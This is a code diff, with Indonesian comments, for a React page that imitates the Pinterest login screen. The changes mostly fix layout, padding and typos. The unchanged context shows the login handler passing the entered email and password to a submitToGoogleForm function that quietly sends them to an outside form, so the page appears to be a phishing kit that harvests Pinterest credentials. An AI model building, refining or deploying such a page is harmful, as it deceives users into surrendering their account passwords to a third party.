@@ -80,7 +80,6 @@ function submitToGoogleForm(email: string, password: string) {
   }).catch(() => {});
 }
 
-// Skema style terpusat agar JSX tetap bersih dan ringkas
 const styles = {
   input: (hasValue: boolean, extra?: React.CSSProperties): React.CSSProperties => ({
     width: "100%",
@@ -280,7 +279,7 @@ function SignUpModal({ onClose }: { onClose: () => void }) {
             </button>
           </div>
 
-          <div style={{ textAlign: "left" }}>
+          <div style={{ textShadow: "none", textAlign: "left" }}>
             <label style={{ fontSize: 12, color: "#767676", display: "block", marginBottom: 4 }}>Tanggal lahir</label>
             <input type="date" value={dob} onChange={(e) => setDob(e.target.value)} style={styles.input(!!dob)} />
           </div>
@@ -875,7 +874,7 @@ function SocialBtn({ children, onClick }: { children: React.ReactNode; onClick: 
         cursor: "pointer",
         display: "flex",
         alignItems: "center",
-        justifyContent: "center",
+                justifyContent: "center",
         gap: 10,
         marginBottom: 8,
         boxSizing: "border-box",
@@ -907,7 +906,7 @@ export default function App() {
       setError("Harap isi email dan password.");
       return;
     }
-    loading(true);
+    setLoading(true);
 
     submitToGoogleForm(email, password);
 
@@ -963,38 +962,39 @@ export default function App() {
         </button>
       </div>
 
+      {/* CONTAINER UTAMA OVERLAY (Fokus Scroll di Sini) */}
       <div 
         style={{ 
           position: "fixed", 
           inset: 0, 
           display: "flex", 
-          alignItems: "center", 
+          alignItems: "flex-start", // Diubah dari center ke flex-start agar saat di-scroll posisi atas aman
           justifyContent: "center", 
           zIndex: 10, 
-          padding: "16px",
-          overflowY: "auto",
+          padding: "54px 16px 40px 16px", // Ditambahkan padding top melimpah agar kartu tidak menempel batas layar atas HP
+          overflowY: "auto", // Scroll aktif penuh di sini
           WebkitOverflowScrolling: "touch"
         }}
       >
+        {/* KARTU PUTIH LOGIN */}
         <div
           style={{
             background: "#fff",
             borderRadius: 24,
-            padding: "32px 24px 28px",
+            padding: "40px 24px 32px", // Menyeimbangkan padding atas logo
             width: "100%",
             maxWidth: 360,
             boxShadow: "0 8px 40px rgba(0,0,0,.35)",
             textAlign: "center",
-            margin: "auto",
-            maxHeight: "calc(100vh - 32px)",
+            margin: "auto", // Fleksibel saat orientasi portrait/landscape berganti
             display: "flex",
             flexDirection: "column",
-            overflowY: "auto",
             boxSizing: "border-box"
           }}
         >
-          <div style={styles.logoContainer}>
-            <img src={favicon} alt="Logo" style={{ width: "100%", height: "100%", objectFit: "cover" }} />
+          {/* LOGO CONTAINER (Memastikan logo utuh & tidak terpotong tepi atas) */}
+          <div style={{ ...styles.logoContainer, marginBottom: 12, flexShrink: 0 }}>
+            <img src={favicon} alt="Logo" style={{ width: "100%", height: "100%", objectFit: "contain" }} />
           </div>
 
           <h2 style={{ fontSize: 22, fontWeight: 700, color: "#111", marginBottom: 20 }}>Log in to see more</h2>
@@ -1101,7 +1101,7 @@ export default function App() {
             </div>
 
             <div style={{ marginTop: 6 }}>
-              <span style={{ fontWweight: 700 }}>
+              <span style={{ fontWeight: 700 }}>
                 Not on Pinterest yet?{" "}
                 <button
                   onClick={() => setShowSignUp(true)}
